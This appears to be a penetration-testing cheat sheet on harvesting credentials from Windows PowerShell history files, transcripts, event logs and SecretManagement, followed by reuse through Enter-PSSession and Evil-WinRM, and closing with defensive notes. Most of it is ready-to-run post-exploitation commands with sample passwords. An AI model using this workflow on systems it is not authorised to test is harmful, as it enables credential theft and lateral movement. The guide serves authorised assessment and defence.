## Overview

PowerShell artifacts can expose credentials, administrative activity, remote access commands, and sensitive operational details.

Useful sources include:

```text
PSReadLine history
PowerShell transcription files
PowerShell Script Block Logging
PowerShell remoting commands
PSCredential creation commands
SecretManagement usage
KeePass / SecretManagement vault references
```

These artifacts are valuable because administrators often use PowerShell for troubleshooting, automation, remote management, and credential handling.

The general methodology is:

```text
Gain shell as a user
↓
Check PowerShell command history
↓
Check PSReadLine history file
↓
Identify transcript paths
↓
Read transcript files
↓
Extract credentials or PSCredential creation commands
↓
Validate access method
↓
Use WinRM / Evil-WinRM if credentials allow
↓
Re-enumerate as the new user
```

> [!important]
> `Clear-History` does not clear the PSReadLine history file. Administrators may believe they cleared their PowerShell history while leaving the command history on disk.

---

# Why PowerShell Artifacts Matter

PowerShell is heavily used by administrators and attackers.

PowerShell logs and history may reveal:

- plaintext passwords
- PSCredential creation commands
- WinRM / PowerShell remoting commands
- server names
- admin usernames
- password manager usage
- SecretManagement vaults
- KeePass references
- commands used to access remote systems
- sensitive paths
- transcript file locations

PowerShell logging is commonly enabled in enterprise environments for defensive visibility. From an assessment perspective, those same logs may contain sensitive data that supports privilege escalation or lateral movement. :contentReference[oaicite:0]{index=0}

# Key PowerShell Artifact Types

| Artifact | Purpose | Why It Matters |
|---|---|---|
| `Get-History` | Shows commands from current PowerShell session | May reveal recent commands, but often empty |
| PSReadLine history | Stores persistent command history on disk | Survives `Clear-History` |
| Transcription logs | Records PowerShell input/output to transcript files | May capture plaintext credentials |
| Script Block Logging | Logs executed PowerShell code blocks as events | May capture decoded or full command content |
| PSCredential objects | Stores username and SecureString password in memory | Creation commands may expose plaintext input |
| SecretManagement commands | Interacts with password vaults | May reveal vault names and secrets |

# 1. Check Current PowerShell History

## Get-History

```powershell
Get-History
```

If empty, do not stop.

`Get-History` only shows the current PowerShell session’s command history.

It may return nothing even when useful command history exists on disk.

---

# 2. Check PSReadLine History

## Why PSReadLine Matters

PowerShell v5, v5.1, and v7 commonly use the `PSReadLine` module for line editing and command history.

This history is saved to disk.

Important point:

```text
Clear-History clears PowerShell's in-memory history, not the PSReadLine history file.
```

---

## Get PSReadLine History Path

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Default path:

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Example:

```text
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Read PSReadLine History

```powershell
type (Get-PSReadLineOption).HistorySavePath
```

or:

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Direct path:

```powershell
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

# 3. Read All Accessible PSReadLine History Files

If access allows, search all user profiles.

```powershell
foreach($user in (Get-ChildItem C:\Users).FullName){
    Get-Content "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

Compact one-liner:

```powershell
foreach($user in ((ls C:\Users).FullName)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

> [!tip]
> Re-run this after gaining another user context or local administrator access. More profile data may become readable.

# 5. SecretManagement and Password Vault Clues

## Why SecretManagement Commands Matter

PowerShell SecretManagement is used to interact with secret vaults.

History may reveal:

```text
vault names
secret names
password manager modules
KeePass usage
plaintext secrets passed to Set-Secret
```

Example commands:

```powershell
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
```

```powershell
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
```

Interpretation:

| Item | Meaning |
|---|---|
| `SecretManagement.keepass` | KeePass-backed SecretManagement vault |
| `pwmanager` | Vault name |
| `Server02 Admin PW` | Secret name likely tied to another host |
| `paperEarMonitor33@` | Plaintext password visible in history |

Follow-up actions:

```text
Try the password against relevant local users
Try the password against remote services within scope
Search for KeePass databases
Search for vault configuration files
Look for hostnames referenced in secret names
```

# 6. Identify PowerShell Transcription

## Why Transcription Matters

PowerShell Transcription records command input and output to text files.

It is often described as “over-the-shoulder transcription” because it records what a user typed and what appeared in the PowerShell host.

Transcript files may contain:

- plaintext passwords
- PSCredential creation commands
- command output
- remote session commands
- usernames
- hostnames
- file paths
- sensitive operational notes

---

## Find Transcript Paths from History

Look for:

```powershell
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
```

The `-Path` value gives the transcript location.

Example path:

```text
C:\Users\Public\Transcripts\transcript01.txt
```

---

## Search for Transcript Files

Common transcript locations:

```text
C:\Users\<user>\Documents\
C:\Users\<user>\Desktop\
C:\Users\Public\
C:\Users\Public\Transcripts\
network shares
central logging directories
```

Search by filename:

```powershell
Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue
```

Search for transcript content indicators:

```powershell
Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "Windows PowerShell transcript start" -ErrorAction SilentlyContinue
```

# 7. Read PowerShell Transcript Files

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

or:

```powershell
Get-Content C:\Users\Public\Transcripts\transcript01.txt
```

Transcript header may show:

```text
Windows PowerShell transcript start
Start time
Username
RunAs User
Machine
Host Application
Process ID
PSVersion
```

Useful fields:

| Field | Why It Matters |
|---|---|
| `Username` | User who started transcript |
| `RunAs User` | Execution context |
| `Machine` | Hostname and OS |
| `Host Application` | PowerShell executable path |
| `PSVersion` | PowerShell version |
| Transcript body | Commands and outputs |

# 8. Extract PSCredential Creation Commands

## Common PSCredential Pattern

PowerShell credential objects are often created like this:

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

```powershell
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

This reveals:

| Value | Meaning |
|---|---|
| `qwertqwertqwert123!!` | Plaintext password |
| `daveadmin` | Username |
| `CLIENTWK220` | Target host |
| `Enter-PSSession` | PowerShell Remoting / WinRM access path |

> [!important]
> If the transcript captured the `ConvertTo-SecureString` command with `-AsPlainText`, the password is exposed.

---

# 9. Reuse PSCredential Commands

If operating inside PowerShell on the target, recreate the credential object.

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

```powershell
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Confirm:

```powershell
whoami
```

Expected:

```text
clientwk220\daveadmin
```

# 10. Use Evil-WinRM for Stable Access

PowerShell remoting inside a limited shell or bind shell may behave unexpectedly.

A more stable approach is to connect from the attack host with Evil-WinRM.

```bash
evil-winrm -i <target_ip> -u <username> -p '<password>'
```

Example with special characters escaped:

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

Confirm:

```powershell
whoami
```

Expected:

```text
clientwk220\daveadmin
```

> [!tip]
> Escape special shell characters such as `!` when passing passwords through Bash.

# 11. WinRM Access Requirements

PowerShell remoting usually uses WinRM.

A user commonly needs membership in one of the relevant groups:

```text
Remote Management Users
Administrators
```

Check user groups:

```cmd
net user <username>
```

Check local group membership:

```powershell
Get-LocalGroupMember "Remote Management Users"
```

```powershell
Get-LocalGroupMember Administrators
```

Check WinRM service:

```cmd
sc query winrm
```

Check listening ports:

```cmd
netstat -ano | findstr 5985
```

Common WinRM ports:

```text
5985 HTTP
5986 HTTPS
```

# 12. Script Block Logging

## Why Script Block Logging Matters

PowerShell Script Block Logging records executed blocks of PowerShell code as Windows events.

It can capture:

- full PowerShell commands
- script contents
- decoded command content
- suspicious functions
- commands run through scripts
- potentially sensitive command arguments

> [!note]
> Script Block Logging is a defensive feature, but it may expose useful information if logs are readable.

---

## Check Script Block Logging Registry Keys

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Look for:

```text
EnableScriptBlockLogging
EnableScriptBlockInvocationLogging
```

PowerShell equivalent:

```powershell
Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -ErrorAction SilentlyContinue
```

---

## Search PowerShell Operational Log

PowerShell Script Block Logging events are commonly stored in:

```text
Microsoft-Windows-PowerShell/Operational
```

Query recent events:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50
```

Search for keywords:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
Where-Object {$_.Message -match "password|credential|ConvertTo-SecureString|Enter-PSSession|Set-Secret"} |
Select-Object -First 20 -ExpandProperty Message
```

Common event ID:

```text
4104
```

Query Script Block Logging events:

```powershell
Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; Id=4104} -ErrorAction SilentlyContinue
```

# 13. Practical Workflow

## Phase 1 – Check PowerShell History

```powershell
Get-History
```

```powershell
(Get-PSReadLineOption).HistorySavePath
```

```powershell
type (Get-PSReadLineOption).HistorySavePath
```

Ask:

```text
Did the user run credential-related commands?
Did they use Clear-History?
Did they reference a transcript file?
Did they use SecretManagement or KeePass?
Did they use PowerShell Remoting?
```

---

## Phase 2 – Search All Accessible PSReadLine Files

```powershell
foreach($user in ((ls C:\Users).FullName)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

Ask:

```text
Can I read another user’s PowerShell history?
Are there admin commands?
Are there passwords or target hostnames?
```

---

## Phase 3 – Locate Transcript Files

From history:

```text
Start-Transcript -Path "<path>"
```

Search manually:

```powershell
Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue
```

Read:

```powershell
type <transcript_path>
```

Ask:

```text
Did the transcript capture omitted credential commands?
Does it contain PSCredential creation?
Does it contain WinRM, PSSession, or Invoke-Command usage?
```

---

## Phase 4 – Extract and Validate Credentials

If a transcript contains:

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<user>", $password)
```

Try:

```powershell
Enter-PSSession -ComputerName <host> -Credential $cred
```

or:

```bash
evil-winrm -i <target_ip> -u <user> -p '<password>'
```

---

## Phase 5 – Re-Enumerate as the New User

After successful access:

```powershell
whoami
whoami /priv
whoami /groups
hostname
```

Then repeat credential hunting:

```powershell
(Get-PSReadLineOption).HistorySavePath
type (Get-PSReadLineOption).HistorySavePath
Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue
```

# Decision Points

## Is `Get-History` Empty?

Do not stop.

Check PSReadLine:

```powershell
(Get-PSReadLineOption).HistorySavePath
```

---

## Does History Contain `Clear-History`?

This is a useful sign.

It may indicate the user tried to hide activity but left PSReadLine history untouched.

---

## Does History Contain `Start-Transcript`?

Read the transcript file.

The transcript may contain commands missing from history.

---

## Does Transcript Contain PSCredential Creation?

Extract:

```text
username
password
target host
remoting method
```

Then validate access.

---

## Does `Enter-PSSession` Behave Oddly?

Use Evil-WinRM from the attack host instead.

```bash
evil-winrm -i <target_ip> -u <user> -p '<password>'
```

# Troubleshooting

## Cannot Read Another User’s History

Possible reasons:

```text
insufficient permissions
user profile not readable
history file does not exist
PowerShell history disabled
profile not initialized
```

Retry after privilege escalation.

---

## PSReadLine History File Missing

Check:

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Check user profile manually:

```powershell
dir C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
```

---

## Password Contains Special Characters

Escape shell metacharacters when using tools from Linux.

Example:

```bash
evil-winrm -i <target_ip> -u daveadmin -p "qwertqwertqwert123\!\!"
```

Or wrap carefully in single quotes when possible:

```bash
evil-winrm -i <target_ip> -u daveadmin -p 'qwertqwertqwert123!!'
```

---

## PSSession Gives No Output

This may happen in unstable shells.

Use Evil-WinRM:

```bash
evil-winrm -i <target_ip> -u <user> -p '<password>'
```

---

## WinRM Fails

Check:

```text
WinRM service running
port 5985 or 5986 reachable
user is allowed to use WinRM
password is correct
local vs domain username format
firewall rules
```

Try username formats:

```text
HOST\user
DOMAIN\user
user
```

# Defensive Notes

## Common Causes of Exposure

PowerShell artifacts expose credentials when users:

- type plaintext passwords into commands
- use `ConvertTo-SecureString -AsPlainText`
- create PSCredential objects manually
- pass credentials to remoting commands
- store secrets with `Set-Secret` using plaintext values
- rely on `Clear-History`
- leave transcript files in readable locations
- centralize transcripts on broadly readable shares
- allow excessive access to PowerShell event logs

---

## Defensive Controls

Recommended mitigations:

```text
avoid typing plaintext passwords into PowerShell
use secure vault workflows
avoid passing credentials on command lines
protect transcript output directories
restrict access to transcript shares
configure PSReadLine history handling appropriately
clear PSReadLine history files when needed
monitor for credential patterns in transcripts and logs
restrict access to PowerShell Operational logs
use Just Enough Administration where possible
use managed service accounts instead of shared passwords
rotate credentials exposed in logs or history
```

Disable PSReadLine command history saving:

```powershell
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

Clear PSReadLine history file manually:

```powershell
Remove-Item (Get-PSReadLineOption).HistorySavePath
```

> [!note]
> Disabling history may impact usability and troubleshooting. Apply according to organizational policy.

---

## Detection Ideas

Monitor for:

```text
ConvertTo-SecureString -AsPlainText

Start-Transcript
access to transcript directories

```

```text

secret
token
credential
ConvertTo-SecureString
PSCredential
```

# Key Takeaways

- `Get-History` may be empty even when useful history exists on disk.
- PSReadLine history is stored separately from normal PowerShell session history.
- `Clear-History` does not clear PSReadLine history.
- `(Get-PSReadLineOption).HistorySavePath` reveals the history file location.
- PowerShell transcripts can capture commands that are missing from history.
- Transcripts may expose plaintext credentials used to create PSCredential objects.
- `Start-Transcript -Path` in history gives a direct path to transcript files.
- Credentials recovered from history or transcripts should be tested against local users, WinRM, remote hosts, and relevant services within scope.
- Evil-WinRM is often more stable than nesting `Enter-PSSession` inside a limited shell.
- Re-run PowerShell artifact hunting after gaining access as a new user or local admin.
